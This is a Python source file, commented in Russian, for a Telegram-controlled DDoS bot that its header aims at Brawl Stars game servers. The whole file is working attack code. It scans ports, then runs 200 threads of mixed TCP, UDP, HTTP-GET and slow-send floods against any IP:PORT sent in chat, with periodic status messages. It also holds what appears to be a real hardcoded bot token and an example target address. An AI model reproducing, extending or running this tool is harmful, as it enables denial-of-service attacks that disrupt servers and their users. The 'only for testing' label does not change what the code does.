#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         BRAWL STARS DDOS BOT - TELEBOT EDITION                       ║
║                                                                      ║
║          Работает на телефоне через Pydroid / Termux                 ║
║          Просто отправь IP:PORT - бот начнёт атаку                   ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import telebot
import socket
import threading
import random
import time
import re
from datetime import datetime

# ============ КОНФИГУРАЦИЯ ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
THREADS = 200  # Для телефона оптимально 150-250

# Хранилище активных атак {chat_id: attack_object}
active_attacks = {}

# Создаём бота
bot = telebot.TeleBot(BOT_TOKEN)

# ============ ДВИЖОК АТАКИ ============

def parse_ip_port(text):
    """Извлекает IP:PORT из текста"""
    pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})'
    match = re.search(pattern, text)
    if match:
        return match.group(1), int(match.group(2))
    
    ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    match = re.search(ip_pattern, text)
    if match:
        return match.group(1), None
    
    return None, None

def scan_brawl_port(ip):
    """Сканирует порты Brawl Stars"""
    brawl_ports = [9339, 15455, 443, 80, 8080, 8443, 3000, 5000]
    for port in brawl_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

def attack_worker(ip, port, thread_id, stop_flag, chat_id):
    """Поток атаки"""
    attack_type = 0
    while not stop_flag.is_set():
        try:
            mode = attack_type % 4
            
            if mode == 0:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(random._urandom(256))
                sock.close()
            
            elif mode == 1:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random._urandom(512), (ip, port))
                sock.close()
            
            elif mode == 2:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
                sock.close()
            
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                for _ in range(5):
                    sock.send(random._urandom(128))
                    time.sleep(0.05)
                sock.close()
            
            attack_type += 1
            
        except:
            pass

class BrawlAttack:
    def __init__(self, ip, port, threads, chat_id):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.chat_id = chat_id
        self.stop_flag = threading.Event()
        self.threads_list = []
        self.start_time = None
        self.active = False
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        for i in range(self.threads):
            t = threading.Thread(target=attack_worker, args=(self.ip, self.port, i, self.stop_flag, self.chat_id))
            t.daemon = True
            self.threads_list.append(t)
            t.start()
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def get_duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ МОНИТОРИНГ В ОТДЕЛЬНОМ ПОТОКЕ ============

def status_monitor():
    """Фоновый поток для отправки статуса"""
    while True:
        time.sleep(15)
        for chat_id, attack in list(active_attacks.items()):
            if attack.active:
                try:
                    bot.send_message(
                        chat_id,
                        f"📊 *Статус атаки*\n\n"
                        f"🎯 Цель: `{attack.ip}:{attack.port}`\n"
                        f"⏱️ Время: {attack.get_duration()} сек\n"
                        f"🧵 Потоков: {attack.threads}\n"
                        f"🔥 Атака активна!",
                        parse_mode="Markdown"
                    )
                except:
                    pass

# ============ ОБРАБОТЧИКИ КОМАНД ============

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🔥 *BRAWL STARS DDOS БОТ* 🔥\n\n"
        "📌 *Как использовать:*\n"
        "Просто отправь IP или IP:PORT\n\n"
        "📝 *Примеры:*\n"
        "`43.158.103.205:15455`\n"
        "`43.158.103.205`\n\n"
        "🛑 *Для остановки:* отправь `stop`\n\n"
        "⚠️ *Только для тестирования!*",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text and message.text.lower() == 'stop')
def stop_attack(message):
    chat_id = message.chat.id
    
    if chat_id in active_attacks and active_attacks[chat_id].active:
        attack = active_attacks[chat_id]
        duration = attack.get_duration()
        attack.stop()
        
        bot.send_message(
            chat_id,
            f"🛑 *АТАКА ОСТАНОВЛЕНА* 🛑\n\n"
            f"📍 Цель: `{attack.ip}:{attack.port}`\n"
            f"⏱️ Длительность: {duration} сек\n\n"
            f"💬 Отправь новый IP для атаки.",
            parse_mode="Markdown"
        )
        del active_attacks[chat_id]
    else:
        bot.send_message(
            chat_id,
            "💤 *Нет активной атаки*\n\nОтправь IP:PORT чтобы начать.",
            parse_mode="Markdown"
        )

@bot.message_handler(func=lambda message: message.text and re.search(r'\d+\.\d+\.\d+\.\d+', message.text))
def handle_ip(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    # Парсим IP и порт
    ip, port = parse_ip_port(text)
    
    if not ip:
        bot.send_message(
            chat_id,
            "❌ *Неверный формат IP*\n\nПример: `43.158.103.205:15455`",
            parse_mode="Markdown"
        )
        return
    
    # Проверяем активную атаку
    if chat_id in active_attacks and active_attacks[chat_id].active:
        attack = active_attacks[chat_id]
        bot.send_message(
            chat_id,
            f"⚠️ *Атака уже идёт!*\n\n"
            f"Текущая цель: `{attack.ip}:{attack.port}`\n"
            f"Отправь *stop* чтобы остановить.",
            parse_mode="Markdown"
        )
        return
    
    # Определяем порт если не указан
    if port is None:
        msg = bot.send_message(chat_id, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
        port = scan_brawl_port(ip)
        bot.edit_message_text(
            f"✅ *Найден порт:* `{port}`\n🚀 Запускаю атаку...",
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
    
    # Запускаем атаку
    attack = BrawlAttack(ip, port, THREADS, chat_id)
    attack.start()
    active_attacks[chat_id] = attack
    
    # Отправляем подтверждение
    bot.send_message(
        chat_id,
        f"🎯 *АТАКА ЗАПУЩЕНА* 🎯\n\n"
        f"📍 Цель: `{ip}:{port}`\n"
        f"⚡ Потоков: {THREADS}\n"
        f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"🔥 *Атака активна!*\n"
        f"💬 Отправь *stop* для остановки\n\n"
        f"📊 Статус будет приходить каждые 15 сек",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def unknown(message):
    bot.send_message(
        message.chat.id,
        "🤔 *Не понял*\n\n"
        "Отправь *IP:PORT* для атаки\n"
        "Или *stop* для остановки\n\n"
        "Пример: `43.158.103.205:15455`",
        parse_mode="Markdown"
    )

# ============ ЗАПУСК ============

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                                ║
    ║     BRAWL STARS DDOS BOT - TELEBOT VERSION                     ║
    ║                                                                ║
    ║     Бот запущен!                                              ║
    ║     Найди бота в Telegram и отправь IP:PORT                   ║
    ║                                                                ║
    ║     Для остановки: stop                                       ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Запускаем фоновый мониторинг
    monitor_thread = threading.Thread(target=status_monitor, daemon=True)
    monitor_thread.start()
    
    # Запускаем бота
    bot.infinity_polling()
